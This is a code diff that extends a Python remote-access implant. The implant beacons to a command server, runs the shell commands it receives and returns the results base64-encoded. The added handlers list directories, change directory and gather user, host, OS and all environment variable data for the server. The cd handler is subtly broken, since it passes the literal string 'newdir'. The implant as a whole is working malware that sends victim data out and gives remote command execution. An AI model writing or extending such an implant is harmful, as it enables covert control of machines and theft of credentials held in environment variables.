@@ -14,7 +14,8 @@ import base64
 import aiohttp
 import asyncio
 import logging
-from datetime import datetime  # Assuming you want to use datetime for timestamps
+import ctypes
+import datetime  # Assuming you want to use datetime for timestamps
 
 class Spy:
 	def __init__(self):
@@ -79,9 +80,6 @@ async def get_env(spy, server):
 
 async def check_in(spy, server):
 	data = {"id": spy.id, "active": spy.active}
-      #  print(123)
-       # print(spy.id)
-        #print(spy.active)
 	async with aiohttp.ClientSession() as session:
 		async with session.post(f"{server}/beacon", json=data) as response:
 			response_text = await response.text()  # Get the response text
@@ -95,13 +93,65 @@ async def cmd_shell(command):
 	print(output)
 	return output
 
-#def cmd_cd():
+async def cmd_cd(newdir):
+	os.chdir('newdir')
+	return "Directory changed to "+newdir
 
+async def cmd_whereami():
+    # User information
+	username = getpass.getuser()
+	hostname = socket.gethostname()
+	user_info = f"User Name: {hostname}\\{username}"
+
+    # Basic system information as a substitute for group information
+	system_info = f"OS: {platform.system()}\nOS Version: {platform.version()}\nMachine: {platform.machine()}\nProcessor: {platform.processor()}\nPython Version: {platform.python_version()}"
+
+    # Environment variables as a substitute for privileges information
+	env_vars = "\n".join([f"{key}: {value}" for key, value in dict(os.environ).items()])
+	output=""
+	output += "USER INFORMATION\n----------------\n" + user_info
+	output += "\nSYSTEM INFORMATION\n------------------\n" + system_info
+	output += "\nENVIRONMENT VARIABLES\n---------------------\n" + env_vars
+	return output
+	
 
 #def cmd_upload():
 
-#def cmd_ls():
+async def cmd_ls(dir):
+	def get_file_attributes(path):
+		attrs = ctypes.windll.kernel32.GetFileAttributesW(path)
+		if attrs == -1:
+			 return "----"
+        
+		attributes = ""
+		attributes += 'd' if attrs & 0x10 else '-'
+		attributes += 'r' if attrs & 0x1 else '-'
+		attributes += 'h' if attrs & 0x2 else '-'
+		attributes += 's' if attrs & 0x4 else '-'
+		attributes += 'a' if attrs & 0x20 else '-'
+		return attributes
 
+    # Function to format file size
+	def format_size(size):
+		for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
+			if size < 1024.0:
+				return f"{size:.2f} {unit}"
+			size /= 1024.0
+		return f"{size:.2f} TB"
+
+
+	output = f" Directory of {dir}\n\n"
+	output += " Mode    LastWriteTime         Size      Name\n"
+	output += " ------  -------------         ----      ----\n"
+
+    # Listing files and directories
+	for entry in os.scandir(dir):
+		mode = get_file_attributes(entry.path)
+		last_write_time = datetime.datetime.fromtimestamp(entry.stat().st_mtime).strftime('%m/%d/%Y  %I:%M %p')
+		size = format_size(entry.stat().st_size) if entry.is_file() else "<DIR>"
+		output += f"{mode:<8} {last_write_time}  {size:<10} {entry.name}\n"
+
+	return output
 
 #def cmd_env():
 
@@ -114,7 +164,28 @@ async def main(ip, port):
 		check_in_response = await check_in(newspy, server)
 		command = check_in_response.get('command')
 		if command:
-			result = await cmd_shell(command)
+			cmd_maincmd=' '.join(command.split()[0:1])
+			cmd_subcmd = ' '.join(command.split()[1:])
+			if cmd_maincmd =='shell':
+				result = await cmd_shell(cmd_subcmd)
+			if cmd_maincmd =='cd':
+				if cmd_subcmd =='':
+					cmd_subcmd=os.getcwd()
+				result = await cmd_cd(cmd_subcmd)				
+
+			if cmd_maincmd =='ls':
+				if cmd_subcmd =='':
+					cmd_subcmd=os.getcwd()
+				result = await cmd_ls(cmd_subcmd)
+
+			if cmd_maincmd =='whereami':
+				result = await cmd_whereami()
+				
+
+		#	if cmd_maincmd =='ipconfig':
+				
+		#	if cmd_maincmd =='whoami':
+				
 			result_bytes = result.encode("ascii")
 			base64_bytes = base64.b64encode(result_bytes)
 			output = base64_bytes.decode("ascii")
